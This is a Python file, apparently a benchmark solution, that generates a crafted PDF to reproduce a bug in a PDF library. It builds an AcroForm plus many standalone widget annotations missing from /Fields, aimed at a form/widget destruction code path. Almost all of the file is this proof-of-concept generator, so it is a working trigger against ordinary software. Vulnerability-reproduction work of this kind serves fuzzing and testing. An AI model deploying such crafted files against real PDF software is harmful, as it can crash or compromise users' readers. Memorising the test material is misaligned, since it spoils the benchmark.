import os
import io
import tarfile
from typing import Dict, List


def _build_pdf(objects: Dict[int, bytes]) -> bytes:
    max_obj = max(objects.keys())
    for i in range(1, max_obj + 1):
        if i not in objects:
            objects[i] = b"<<>>"

    header = b"%PDF-1.7\n%\xff\xff\xff\xff\n"
    out = bytearray(header)

    offsets = [0] * (max_obj + 1)
    for obj_num in range(1, max_obj + 1):
        offsets[obj_num] = len(out)
        body = objects[obj_num]
        out += f"{obj_num} 0 obj\n".encode("ascii")
        out += body
        if not body.endswith(b"\n"):
            out += b"\n"
        out += b"endobj\n"

    xref_pos = len(out)
    out += b"xref\n"
    out += f"0 {max_obj + 1}\n".encode("ascii")
    out += b"0000000000 65535 f \n"
    for obj_num in range(1, max_obj + 1):
        out += f"{offsets[obj_num]:010d} 00000 n \n".encode("ascii")

    out += b"trailer\n"
    out += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode("ascii")
    out += b"startxref\n"
    out += f"{xref_pos}\n".encode("ascii")
    out += b"%%EOF\n"
    return bytes(out)


def _make_poc_pdf(num_standalone_widgets: int = 12) -> bytes:
    # Objects:
    # 1: Catalog (includes AcroForm)
    # 2: Pages
    # 3: Page
    # 4: Font
    # 5: Normal field dict
    # 6: AcroForm dict
    # 7: Widget annot for normal field (in /Fields)
    # 8: Contents stream (invokes optional form XObject, kept empty)
    # 9: Optional Form XObject stream (not referenced; harmless)
    # 10.. : Standalone widget annots (in /Annots only)
    objs: Dict[int, bytes] = {}

    font_obj = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
    objs[4] = font_obj

    field_obj = b"<< /FT /Tx /T (F0) /Kids [7 0 R] >>"
    objs[5] = field_obj

    acroform_obj = b"<< /Fields [5 0 R] /DR << /Font << /Helv 4 0 R >> >> /DA (/Helv 0 Tf 0 g) >>"
    objs[6] = acroform_obj

    widget_in_fields = (
        b"<< /Type /Annot /Subtype /Widget /Rect [10 10 20 20] /P 3 0 R /Parent 5 0 R "
        b"/FT /Tx /T (F0) /V (X) /F 4 /DA (/Helv 0 Tf 0 g) >>"
    )
    objs[7] = widget_in_fields

    contents_stream = b"<< /Length 0 >>\nstream\nendstream"
    objs[8] = contents_stream

    form_xobject = (
        b"<< /Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10] /Resources << >> /Length 0 >>\n"
        b"stream\nendstream"
    )
    objs[9] = form_xobject

    first_standalone = 10
    standalone_nums = list(range(first_standalone, first_standalone + max(1, num_standalone_widgets)))
    for i, n in enumerate(standalone_nums):
        # Standalone widget annotation: not in AcroForm /Fields
        # Include /FT and /T to improve odds it is treated as a form widget.
        t = f"S{i}".encode("ascii")
        v = f"V{i}".encode("ascii")
        rect = f"[{30+i} {30+i} {40+i} {40+i}]".encode("ascii")
        objs[n] = (
            b"<< /Type /Annot /Subtype /Widget /Rect " + rect +
            b" /P 3 0 R /FT /Tx /T (" + t + b") /V (" + v + b") /F 4 /DA (/Helv 0 Tf 0 g) >>"
        )

    annots_array = b"[7 0 R " + b" ".join(f"{n} 0 R".encode("ascii") for n in standalone_nums) + b"]"

    page_obj = (
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] "
        b"/Contents 8 0 R /Annots " + annots_array + b" >>"
    )
    objs[3] = page_obj

    pages_obj = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    objs[2] = pages_obj

    catalog_obj = b"<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R >>"
    objs[1] = catalog_obj

    return _build_pdf(objs)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # The input is expected to be a PDF triggering the standalone form/widget destruction path.
        # src_path is not required to generate the PoC, but we touch it lightly to avoid unused warnings.
        try:
            if src_path and os.path.exists(src_path):
                if os.path.isfile(src_path) and src_path.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz", ".txz")):
                    with tarfile.open(src_path, "r:*") as tf:
                        _ = tf.getmembers()[:1]
        except Exception:
            pass
        return _make_poc_pdf(num_standalone_widgets=16)